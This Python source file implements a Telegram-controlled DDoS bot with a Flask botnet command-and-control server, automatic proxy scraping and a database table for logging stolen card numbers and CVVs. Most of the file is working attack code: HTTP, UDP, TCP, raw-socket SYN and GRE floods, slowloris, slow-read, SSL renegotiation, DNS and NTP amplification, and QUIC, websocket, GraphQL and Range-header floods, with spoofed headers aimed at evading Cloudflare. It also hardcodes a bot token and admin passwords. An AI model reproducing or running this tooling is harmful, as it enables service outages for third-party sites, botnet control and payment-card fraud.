#!/usr/bin/env python3
"""
TELEGRAM DDOS BOT - KHÔNG GIỚI HẠN (BẢN NÂNG CẤP CAO NHẤT + THÊM TÍNH NĂNG)
- Giữ nguyên mọi tính năng cũ
- Thêm botnet mạnh, database, broadcast, update client, báo cáo chi tiết
- Thêm chart, deploy, version, update, cvv, getcvv
- Thêm 10+ method DDoS mới (http2, synack, gre, quic, ws, graphql, range, pipeline, slow_adv, tls_adv)
- Thêm nguồn proxy, tăng lên 500
- ĐÃ SỬA LỖI: check web chính xác, proxy tự động loại bỏ khi chết, retry khi request fail
- THÊM MỚI: WiFi Deauth, Bluetooth Deauth, WiFi Crack, Quét WiFi/Bluetooth, Full Attack 2026
"""
 
import telebot
import threading
import requests
import time
import random
import json
import os
import socket
import ssl
import sys
import signal
import logging
import sqlite3
from datetime import datetime
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed
from flask import Flask, request
 
# === THƯ VIỆN THÊM MỚI ===
import matplotlib.pyplot as plt
import io
import hashlib
import base64
from cryptography.fernet import Fernet
 
# === THƯ VIỆN CHO WIFI/BLUETOOTH ATTACK ===
import struct
import secrets
import subprocess
import platform
import re
import uuid

if sys.stdout:
    sys.stdout.reconfigure(encoding="utf-8")
if sys.stderr:
    sys.stderr.reconfigure(encoding="utf-8")
# ==================== CẤU HÌNH ====================
BOT_TOKEN = "8942578560:AAEbEds14Ht-un58RZaIiMSOoB1PwrYkG7w"
ADMIN_ID = 8051787133
ADMIN_PASSWORD = "7788"
MASTER_KEY = "7788"
CURRENT_VERSION = "3.0"
GITHUB_REPO = "https://raw.githubusercontent.com/YOUR_USERNAME/YOUR_REPO/main/bot.py"  # THAY LINK GITHUB
 
bot = telebot.TeleBot(BOT_TOKEN)
 
# Xóa webhook cũ
try:
    bot.delete_webhook()
    print("✅ Đã xóa webhook cũ")
except Exception as e:
    print(f"⚠️ Không thể xóa webhook: {e}")
 
# File lưu dữ liệu cũ
KEYS_FILE = "keys.json"
HISTORY_FILE = "history.json"
PROXY_FILE = "proxy.txt"
USER_FILE = "users.json"
LOG_FILE = "ddos_bot.log"
 
# Cấu hình logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(LOG_FILE),
        logging.StreamHandler()
    ]
)
 
# === BOTNET NÂNG CẤP: SQLITE DATABASE ===
def init_db():
    conn = sqlite3.connect('c2.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS clients
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, ip TEXT, last_seen TEXT, info TEXT, status TEXT, version TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS attacks
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, target TEXT, workers TEXT, rps TEXT, method TEXT, duration TEXT, time TEXT, status TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS reports
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, client_ip TEXT, result TEXT, time TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS cvv_logs
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, cc TEXT, cvv TEXT, exp TEXT, time TEXT)''')
    conn.commit()
    conn.close()
 
init_db()
 
def save_client(ip, info, version="1.0"):
    conn = sqlite3.connect('c2.db')
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO clients (ip, last_seen, info, status, version) VALUES (?, ?, ?, ?, ?)",
              (ip, datetime.now().isoformat(), json.dumps(info), "active", version))
    conn.commit()
    conn.close()
 
def save_attack(target, workers, rps, method, duration):
    conn = sqlite3.connect('c2.db')
    c = conn.cursor()
    c.execute("INSERT INTO attacks (target, workers, rps, method, duration, time, status) VALUES (?, ?, ?, ?, ?, ?, ?)",
              (target, workers, rps, method, duration, datetime.now().isoformat(), "sent"))
    conn.commit()
    conn.close()
 
def save_report(client_ip, result):
    conn = sqlite3.connect('c2.db')
    c = conn.cursor()
    c.execute("INSERT INTO reports (client_ip, result, time) VALUES (?, ?, ?)",
              (client_ip, result, datetime.now().isoformat()))
    conn.commit()
    conn.close()
 
def save_cvv(cc, cvv, exp):
    conn = sqlite3.connect('c2.db')
    c = conn.cursor()
    c.execute("INSERT INTO cvv_logs (cc, cvv, exp, time) VALUES (?, ?, ?, ?)",
              (cc, cvv, exp, datetime.now().isoformat()))
    conn.commit()
    conn.close()
 
# Biến toàn cục
attacks = {}
request_counts = defaultdict(int)
logged_in = {}
proxy_list = []
botnet_clients = []
lock = threading.Lock()
rate_limit_storage = defaultdict(list)
 
# === Biến toàn cục cho WiFi/Bluetooth Attack ===
active_deauth = {}
deauth_lock = threading.Lock()
active_bt_deauth = {}
bt_deauth_lock = threading.Lock()
 
# === Biến toàn cục cho BOTNET C2 ===
BOTNET_HIERARCHY = {
    "master_nodes": {},
    "slave_nodes": {},
    "tasks": {},
    "completed_tasks": [],
    "collected_data": []
}
 
# === BOTNET: Flask API cho client ===
flask_app = Flask(__name__)
current_botnet_command = None
 
@flask_app.route('/register', methods=['POST'])
def register():
    data = request.json
    secret = data.get('secret')
    if secret != MASTER_KEY:
        return "Unauthorized", 401
    client_ip = request.remote_addr
    info = data.get('info', {})
    version = data.get('version', '1.0')
    for c in botnet_clients:
        if c['ip'] == client_ip:
            c['last_seen'] = time.time()
            c['version'] = version
            save_client(client_ip, info, version)
            return "OK", 200
    botnet_clients.append({'ip': client_ip, 'last_seen': time.time(), 'info': info, 'version': version})
    save_client(client_ip, info, version)
    print(f"✅ Client mới: {client_ip} (v{version})")
    return "OK", 200
 
@flask_app.route('/get_command', methods=['GET'])
def get_command():
    secret = request.args.get('secret')
    if secret != MASTER_KEY:
        return "Unauthorized", 401
    if current_botnet_command:
        return current_botnet_command, 200
    return "None", 200
 
@flask_app.route('/report', methods=['POST'])
def report():
    data = request.json
    secret = data.get('secret')
    if secret != MASTER_KEY:
        return "Unauthorized", 401
    client_ip = request.remote_addr
    result = data.get('result')
    save_report(client_ip, result)
    print(f"📊 Report từ {client_ip}: {result}")
    return "OK", 200
 
@flask_app.route('/static/client.py', methods=['GET'])
def get_client_code():
    try:
        with open("client.py", "r") as f:
            return f.read(), 200
    except:
        return "Client code not found", 404
 
@flask_app.route('/update', methods=['GET'])
def update_client():
    secret = request.args.get('secret')
    if secret != MASTER_KEY:
        return "Unauthorized", 401
    try:
        with open("client.py", "r") as f:
            return f.read(), 200
    except:
        return "Client code not found", 404
 
def run_botnet_api():
    port = int(os.environ.get("BOTNET_PORT", 8080))
    flask_app.run(host='0.0.0.0', port=port, debug=False)
 
threading.Thread(target=run_botnet_api, daemon=True).start()
# === END BOTNET ===
 
DNS_SERVERS = ["8.8.8.8", "1.1.1.1", "8.8.4.4", "9.9.9.9", "208.67.222.222", "208.67.220.220"]
NTP_SERVERS = ["time.google.com", "time.cloudflare.com", "pool.ntp.org", "time.nist.gov"]
MEMCACHED_SERVERS = []
 
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; SM-S911B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/118.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
]
 
REFERERS = [
    "https://www.google.com/", "https://www.facebook.com/", "https://www.youtube.com/",
    "https://www.bing.com/", "https://www.yahoo.com/", "https://www.amazon.com/",
    "https://www.twitter.com/", "https://www.instagram.com/", "https://www.tiktok.com/",
    "https://www.reddit.com/", "https://www.wikipedia.org/", "https://www.linkedin.com/",
    "https://www.github.com/", "https://stackoverflow.com/", "https://news.ycombinator.com/"
]
 
# ==================== HÀM TIỆN ÍCH ====================
def random_ip():
    return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
 
def random_cf_header():
    return {
        "CF-Ray": f"cf-{random.randint(1000,9999)}-{random.randint(100,999)}",
        "CF-IPCountry": random.choice(["VN", "US", "JP", "KR", "SG", "DE", "FR"]),
        "CF-Connecting-IP": random_ip(),
    }
 
def get_headers():
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "vi-VN,vi;q=0.9,en-US;q=0.6,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Cache-Control": "no-cache, no-store, must-revalidate",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Referer": random.choice(REFERERS),
        "X-Forwarded-For": random_ip(),
        "X-Real-IP": random_ip(),
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Site": "none",
        "Pragma": "no-cache",
        "DNT": "1",
    }
    cf_headers = random_cf_header()
    headers.update(cf_headers)
    return headers
 
def random_query_string(url):
    chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    param = "".join(random.choice(chars) for _ in range(random.randint(5, 12)))
    value = random.randint(1000, 9999)
    if "?" in url:
        return f"{url}&{param}={value}&_={int(time.time())}&cf_cache={random.randint(100,999)}"
    return f"{url}?{param}={value}&_={int(time.time())}&cf_cache={random.randint(100,999)}"
 
def is_target_alive(target):
    try:
        headers = get_headers()
        r = requests.get(target, headers=headers, timeout=5, allow_redirects=True)
        if "cf-challenge" in r.text.lower() or "cloudflare" in r.text.lower():
            return "CF_CHALLENGE", r.status_code
        return "ALIVE", r.status_code
    except:
        return "DEAD", None
 
def is_rate_limited(user_id, limit=20, window=60):
    now = time.time()
    rate_limit_storage[user_id] = [t for t in rate_limit_storage[user_id] if now - t < window]
    if len(rate_limit_storage[user_id]) >= limit:
        return True
    rate_limit_storage[user_id].append(now)
    return False
 
# ==================== HÀM CHECK WEB CHÍNH XÁC ====================
def is_web_alive(target):
    for attempt in range(3):
        try:
            headers = {
                "User-Agent": random.choice(USER_AGENTS),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "vi-VN,vi;q=0.9,en-US;q=0.6,en;q=0.5",
                "Cache-Control": "no-cache",
                "Connection": "keep-alive",
            }
            r = requests.get(target, headers=headers, timeout=5, allow_redirects=True)
            if r.status_code < 500:
                return True
            if r.status_code in [403, 429, 503]:
                return True
            if "cf-challenge" in r.text.lower() or "cloudflare" in r.text.lower():
                return True
        except requests.exceptions.Timeout:
            continue
        except requests.exceptions.ConnectionError:
            if attempt == 2:
                return False
            continue
        except:
            pass
        time.sleep(1)
    try:
        host = target.replace("https://", "").replace("http://", "").split("/")[0]
        port = 443 if "https://" in target else 80
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        result = sock.connect_ex((host, port))
        sock.close()
        if result == 0:
            return True
    except:
        pass
    return False
 
# ==================== QUẢN LÝ KEY VÀ LỊCH SỬ ====================
def load_keys():
    if not os.path.exists(KEYS_FILE):
        return {}
    try:
        with open(KEYS_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        return {}
 
def save_keys(keys):
    with open(KEYS_FILE, 'w', encoding='utf-8') as f:
        json.dump(keys, f, ensure_ascii=False, indent=2)
 
def generate_key():
    import secrets
    return secrets.token_hex(10)
 
def create_key(admin_id, days=30, max_uses=1):
    keys = load_keys()
    new_key = generate_key()
    keys[new_key] = {
        'created_by': admin_id,
        'created_at': time.time(),
        'expiry': time.time() + (days * 86400),
        'used_by': [],
        'max_uses': max_uses,
    }
    save_keys(keys)
    logging.info(f"Admin {admin_id} tạo key {new_key} - {days} ngày")
    return new_key
 
def delete_key(key):
    keys = load_keys()
    if key in keys:
        del keys[key]
        save_keys(keys)
        logging.info(f"Key {key} đã bị xóa")
        return True
    return False
 
def check_key(key, user_id):
    keys = load_keys()
    if key not in keys:
        return {'valid': False, 'reason': 'Key không tồn tại'}
    data = keys[key]
    if time.time() > data['expiry']:
        return {'valid': False, 'reason': 'Key đã hết hạn'}
    if len(data.get('used_by', [])) >= data.get('max_uses', 1):
        return {'valid': False, 'reason': 'Key đã dùng hết số lần'}
    return {'valid': True, 'expiry': data['expiry']}
 
def use_key(key, user_id):
    keys = load_keys()
    if key not in keys:
        return False
    if user_id not in keys[key].get('used_by', []):
        keys[key].setdefault('used_by', []).append(user_id)
        save_keys(keys)
        logging.info(f"Key {key} được dùng bởi user {user_id}")
    return True
 
def load_history():
    if not os.path.exists(HISTORY_FILE):
        return []
    try:
        with open(HISTORY_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        return []
 
def save_history(history):
    with open(HISTORY_FILE, 'w', encoding='utf-8') as f:
        json.dump(history[:50], f, ensure_ascii=False, indent=2)
 
def add_to_history(target, total_reqs, max_rps, duration, workers, method, rps_target, web_died=False):
    history = load_history()
    history.insert(0, {
        'target': target,
        'requests': total_reqs,
        'max_rps': max_rps,
        'duration': duration,
        'workers': workers,
        'method': method,
        'rps_target': rps_target,
        'web_died': web_died,
        'time': datetime.now().strftime("%H:%M:%S %d/%m/%Y")
    })
    save_history(history)
 
def load_users():
    if not os.path.exists(USER_FILE):
        return {}
    try:
        with open(USER_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        return {}
 
def save_users(users):
    with open(USER_FILE, 'w', encoding='utf-8') as f:
        json.dump(users, f, ensure_ascii=False, indent=2)
 
# ==================== PROXY TỰ ĐỘNG ====================
def fetch_free_proxies():
    proxies = []
    try:
        url = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=5000&country=all&ssl=all&anonymity=all"
        r = requests.get(url, timeout=10)
        proxies += [p.strip() for p in r.text.split('\r\n') if p.strip()]
        logging.info(f"Lấy {len([p for p in proxies if p])} proxy từ proxyscrape")
    except Exception as e:
        logging.warning(f"Lỗi lấy proxy từ proxyscrape: {e}")
    try:
        url = "https://proxylist.geonode.com/api/proxy-list?limit=100&page=1&sort_by=lastChecked&sort_type=desc"
        r = requests.get(url, timeout=10)
        data = r.json()
        for p in data.get('data', []):
            proxies.append(f"{p['ip']}:{p['port']}")
        logging.info(f"Lấy {len(data.get('data', []))} proxy từ geonode")
    except Exception as e:
        logging.warning(f"Lỗi lấy proxy từ geonode: {e}")
    try:
        url = "https://free-proxy-list.net/"
        r = requests.get(url, timeout=10)
        import re
        pattern = r'</td>(\d+\.\d+\.\d+\.\d+)</td><td>(\d+)</td>'
        matches = re.findall(pattern, r.text)
        for match in matches[:50]:
            proxies.append(f"{match[0]}:{match[1]}")
        logging.info(f"Lấy {len(matches[:50])} proxy từ free-proxy-list")
    except Exception as e:
        logging.warning(f"Lỗi lấy proxy từ free-proxy-list: {e}")
    try:
        url = "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt"
        r = requests.get(url, timeout=10)
        proxies += [p.strip() for p in r.text.split('\n') if p.strip() and ':' in p]
    except: pass
    try:
        url = "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt"
        r = requests.get(url, timeout=10)
        proxies += [p.strip() for p in r.text.split('\n') if p.strip() and ':' in p]
    except: pass
    try:
        url = "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt"
        r = requests.get(url, timeout=10)
        proxies += [p.strip() for p in r.text.split('\n') if p.strip() and ':' in p]
    except: pass
    try:
        url = "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt"
        r = requests.get(url, timeout=10)
        proxies += [p.strip() for p in r.text.split('\n') if p.strip() and ':' in p]
    except: pass
    proxies = list(dict.fromkeys(proxies))
    return proxies[:500]
 
def check_proxy(proxy):
    try:
        r = requests.get("http://httpbin.org/ip", proxies={"http": proxy, "https": proxy}, timeout=5)
        return proxy if r.status_code == 200 else None
    except:
        return None
 
def update_proxy_list():
    global proxy_list
    logging.info("Đang cập nhật proxy...")
    raw = fetch_free_proxies()
    if not raw:
        logging.warning("Không lấy được proxy raw")
        return
    alive = []
    with ThreadPoolExecutor(max_workers=50) as executor:
        futures = {executor.submit(check_proxy, p): p for p in raw[:200]}
        for future in as_completed(futures):
            result = future.result()
            if result:
                alive.append(result)
    if alive:
        fast_proxies = []
        for p in alive[:50]:
            try:
                start = time.time()
                r = requests.get("http://httpbin.org/ip", proxies={"http": p, "https": p}, timeout=3)
                elapsed = time.time() - start
                if elapsed < 2:
                    fast_proxies.append(p)
            except:
                pass
        if fast_proxies:
            alive = fast_proxies
            logging.info(f"✅ Lọc nhanh: giữ lại {len(fast_proxies)} proxy (response < 2s)")
    if alive:
        proxy_list = alive
        with open(PROXY_FILE, 'w') as f:
            for p in proxy_list:
                f.write(p + "\n")
        logging.info(f"Đã cập nhật {len(proxy_list)} proxy")
    else:
        if os.path.exists(PROXY_FILE):
            with open(PROXY_FILE, 'r') as f:
                proxy_list = [p.strip() for p in f if p.strip() and not p.startswith('#')]
            logging.info(f"Đã tải {len(proxy_list)} proxy từ file backup")
 
def get_random_proxy():
    global proxy_list
    if not proxy_list:
        return None
    for _ in range(5):
        proxy = random.choice(proxy_list)
        try:
            test_url = "http://httpbin.org/ip"
            r = requests.get(test_url, proxies={"http": proxy, "https": proxy}, timeout=3)
            if r.status_code == 200:
                return {"http": proxy, "https": proxy}
            else:
                if proxy in proxy_list:
                    proxy_list.remove(proxy)
        except:
            if proxy in proxy_list:
                proxy_list.remove(proxy)
            continue
    return None
 
# ==================== CÁC WORKER TẤN CÔNG ====================
def http_worker(chat_id, target, delay_ms, worker_id):
    session = requests.Session()
    while attacks.get(chat_id, {}).get('active', False):
        try:
            url = random_query_string(target)
            headers = get_headers()
            session.get(url, headers=headers, timeout=2, proxies=get_random_proxy())
            session.head(url, headers=headers, timeout=1)
            session.options(url, headers=headers, timeout=1)
            session.post(url, headers=headers, data={'x': random.random()}, timeout=2)
            with lock:
                request_counts[chat_id] += 4
        except:
            pass
        time.sleep(delay_ms / 1000)
 
def udp_worker(chat_id, target, delay_ms, worker_id):
    try:
        # استخراج الجزء الخاص بالـ host والـ port
        clean_target = target.replace("https://", "").replace("http://", "").split("/")[0]
        
        host = clean_target
        port = 80  # منفذ افتراضي
        
        # التحقق إذا كان المستخدم كتب منفذ مخصص (مثل 192.168.1.1:8080)
        if ':' in clean_target:
            parts = clean_target.split(':')
            if len(parts) == 2 and parts[1].isdigit():
                host = parts[0]
                port = int(parts[1])
        # إذا كان الهدف يبدأ بـ https:// ولم يحدد منفذ، استخدم 443
        elif "https://" in target:
            port = 443
        # وإلا يبقى 80
        
    except Exception as e:
        # في حال حدوث خطأ في التحليل، اطبع الخطأ وتوقف
        print(f"[UDP Worker Error] {e}")
        return

    while attacks.get(chat_id, {}).get('active', False):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            for _ in range(10):
                payload = random._urandom(2048)  # حزمة بحجم 2 كيلوبايت
                sock.sendto(payload, (host, port))
            sock.close()
            with lock:
                request_counts[chat_id] += 10
        except Exception as e:
            # لوضع调试، اطبع الخطأ بدلاً من تجاهله (يمكنك إزالة هذا السطر بعد الاختبار)
            # print(f"[UDP Send Error] {e}")
            pass
        time.sleep(delay_ms / 1000)
 
def tcp_worker(chat_id, target, delay_ms, worker_id):
    try:
        host = target.replace("https://", "").replace("http://", "").split("/")[0]
        port = 80 if "http://" in target else 443
    except:
        host = target
        port = 80
    while attacks.get(chat_id, {}).get('active', False):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((host, port))
            sock.sendto(b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\n\r\n", (host, port))
            sock.close()
            with lock:
                request_counts[chat_id] += 1
        except:
            pass
        time.sleep(delay_ms / 1000)
 
def slowloris_worker(chat_id, target, delay_ms, worker_id):
    try:
        host = target.replace("https://", "").replace("http://", "").split("/")[0]
        port = 80 if "http://" in target else 443
    except:
        host = target
        port = 80
    sockets = []
    while attacks.get(chat_id, {}).get('active', False):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((host, port))
            sock.sendto(f"GET / HTTP/1.1\r\nHost: {host}\r\n".encode(), (host, port))
            sockets.append(sock)
            for s in sockets[:]:
                try:
                    s.sendto(f"X-Header-{random.randint(1,9999)}: {random.randint(1,9999)}\r\n".encode(), (host, port))
                    with lock:
                        request_counts[chat_id] += 1
                except:
                    sockets.remove(s)
            time.sleep(random.uniform(0.5, 1.5))
        except:
            pass
 
def https_flood_worker(chat_id, target, delay_ms, worker_id):
    try:
        host = target.replace("https://", "").replace("http://", "").split("/")[0]
        port = 443
    except:
        host = target
        port = 443
    while attacks.get(chat_id, {}).get('active', False):
        try:
            context = ssl.create_default_context()
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((host, port))
            ssock = context.wrap_socket(sock, server_hostname=host)
            headers = get_headers()
            request = f"GET / HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {headers['User-Agent']}\r\nReferer: {headers['Referer']}\r\nX-Forwarded-For: {headers['X-Forwarded-For']}\r\n\r\n"
            ssock.send(request.encode())
            ssock.close()
            with lock:
                request_counts[chat_id] += 1
        except:
            pass
        time.sleep(delay_ms / 1000)
 
def dns_amplification_worker(chat_id, target, delay_ms, worker_id):
    query = b'\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00'
    query += b'\x03www\x07example\x03com\x00\x00\x01\x00\x01' * 50
    while attacks.get(chat_id, {}).get('active', False):
        for dns_server in DNS_SERVERS:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(query, (dns_server, 53))
                sock.close()
                with lock:
                    request_counts[chat_id] += 1
            except:
                pass
        time.sleep(delay_ms / 1000)
 
def ntp_amplification_worker(chat_id, target, delay_ms, worker_id):
    monlist_packet = b'\x17\x00\x03\x2a' + b'\x00' * 4
    while attacks.get(chat_id, {}).get('active', False):
        for ntp_server in NTP_SERVERS:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(monlist_packet, (ntp_server, 123))
                sock.close()
                with lock:
                    request_counts[chat_id] += 1
            except:
                pass
        time.sleep(delay_ms / 1000)
 
def ssl_renegotiation_worker(chat_id, target, delay_ms, worker_id):
    try:
        host = target.replace("https://", "").replace("http://", "").split("/")[0]
    except:
        host = target
    while attacks.get(chat_id, {}).get('active', False):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((host, 443))
            context = ssl.create_default_context()
            ssock = context.wrap_socket(sock, server_hostname=host)
            for _ in range(5):
                ssock.do_handshake()
            ssock.close()
            with lock:
                request_counts[chat_id] += 5
        except:
            pass
        time.sleep(delay_ms / 1000)
 
def slow_read_worker(chat_id, target, delay_ms, worker_id):
    try:
        host = target.replace("https://", "").replace("http://", "").split("/")[0]
        port = 80 if "http://" in target else 443
    except:
        host = target
        port = 80
    while attacks.get(chat_id, {}).get('active', False):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((host, port))
            sock.sendto(b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\n\r\n", (host, port))
            while attacks.get(chat_id, {}).get('active', False):
                sock.recv(1)
                time.sleep(0.5)
            sock.close()
        except:
            pass
 
def combo_worker(chat_id, target, delay_ms, worker_id):
    try:
        host = target.replace("https://", "").replace("http://", "").split("/")[0]
        port = 80 if "http://" in target else 443
    except:
        host = target
        port = 80
    session = requests.Session()
    while attacks.get(chat_id, {}).get('active', False):
        retry_count = 0
        success = False
        while retry_count < 2 and not success:
            try:
                headers = get_headers()
                url = random_query_string(target)
                proxy = get_random_proxy()
                proxy_to_use = proxy if proxy else None
                session.get(url, headers=headers, timeout=2, proxies=proxy_to_use)
                session.post(url, headers=headers, data={'x': random.random()}, timeout=2, proxies=proxy_to_use)
                session.head(url, headers=headers, timeout=1, proxies=proxy_to_use)
                session.options(url, headers=headers, timeout=1, proxies=proxy_to_use)
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(random._urandom(1024), (host, port))
                sock.close()
                sock2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock2.settimeout(0.5)
                sock2.connect((host, port))
                sock2.close()
                with lock:
                    request_counts[chat_id] += 6
                success = True
            except Exception as e:
                retry_count += 1
                if retry_count >= 2:
                    pass
                time.sleep(0.1)
        time.sleep(delay_ms / 1000)
 
def http2_worker(chat_id, target, delay_ms, worker_id):
    try:
        import h2.connection
        import h2.config
        host = target.replace("https://", "").replace("http://", "").split("/")[0]
        port = 443
        while attacks.get(chat_id, {}).get('active', False):
            try:
                config = h2.config.H2Configuration(client_side=True)
                conn = h2.connection.H2Connection(config=config)
                conn.initiate_connection()
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                context = ssl.create_default_context()
                sock = context.wrap_socket(sock, server_hostname=host)
                sock.connect((host, port))
                sock.send(conn.data_to_send())
                for i in range(30):
                    conn.send_headers(i, [(':method', 'GET'), (':path', '/'), (':authority', host)])
                    conn.send_data(i, b'')
                    sock.send(conn.data_to_send())
                sock.close()
                with lock:
                    request_counts[chat_id] += 30
            except:
                pass
            time.sleep(delay_ms / 1000)
    except:
        pass
 
def syn_ack_worker(chat_id, target, delay_ms, worker_id):
    try:
        host = target.replace("https://", "").replace("http://", "").split("/")[0]
        port = 80 if "http://" in target else 443
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        while attacks.get(chat_id, {}).get('active', False):
            sock.sendto(random._urandom(40), (host, port))
            with lock:
                request_counts[chat_id] += 1
            time.sleep(delay_ms / 1000)
    except:
        pass
 
def gre_worker(chat_id, target, delay_ms, worker_id):
    try:
        host = target.replace("https://", "").replace("http://", "").split("/")[0]
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_GRE)
        while attacks.get(chat_id, {}).get('active', False):
            sock.sendto(random._urandom(1024), (host, 0))
            with lock:
                request_counts[chat_id] += 1
            time.sleep(delay_ms / 1000)
    except:
        pass
 
def quic_worker(chat_id, target, delay_ms, worker_id):
    try:
        host = target.replace("https://", "").replace("http://", "").split("/")[0]
        port = 443
        while attacks.get(chat_id, {}).get('active', False):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                quic_packet = b'\xc0\x00\x00\x00\x01' + random._urandom(1200)
                sock.sendto(quic_packet, (host, port))
                sock.close()
                with lock:
                    request_counts[chat_id] += 1
            except:
                pass
            time.sleep(delay_ms / 1000)
    except:
        pass
 
def websocket_worker(chat_id, target, delay_ms, worker_id):
    try:
        host = target.replace("https://", "").replace("http://", "").split("/")[0]
        port = 80 if "http://" in target else 443
        while attacks.get(chat_id, {}).get('active', False):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((host, port))
                key = base64.b64encode(random._urandom(16)).decode()
                handshake = f"GET /ws HTTP/1.1\r\nHost: {host}\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: {key}\r\nSec-WebSocket-Version: 13\r\n\r\n"
                sock.send(handshake.encode())
                sock.close()
                with lock:
                    request_counts[chat_id] += 1
            except:
                pass
            time.sleep(delay_ms / 1000)
    except:
        pass
 
def graphql_worker(chat_id, target, delay_ms, worker_id):
    session = requests.Session()
    while attacks.get(chat_id, {}).get('active', False):
        try:
            headers = get_headers()
            headers["Content-Type"] = "application/json"
            query = {"query": "query { " + " __typename " * 100 + " }"}
            session.post(target + "/graphql", headers=headers, json=query, timeout=1, proxies=get_random_proxy())
            with lock:
                request_counts[chat_id] += 1
        except:
            pass
        time.sleep(delay_ms / 1000)
 
def range_worker(chat_id, target, delay_ms, worker_id):
    session = requests.Session()
    while attacks.get(chat_id, {}).get('active', False):
        try:
            headers = get_headers()
            headers["Range"] = "bytes=0-9,10-19,20-29,30-39,40-49,50-59,60-69,70-79,80-89,90-99"
            session.get(target, headers=headers, timeout=1, proxies=get_random_proxy())
            with lock:
                request_counts[chat_id] += 10
        except:
            pass
        time.sleep(delay_ms / 1000)
 
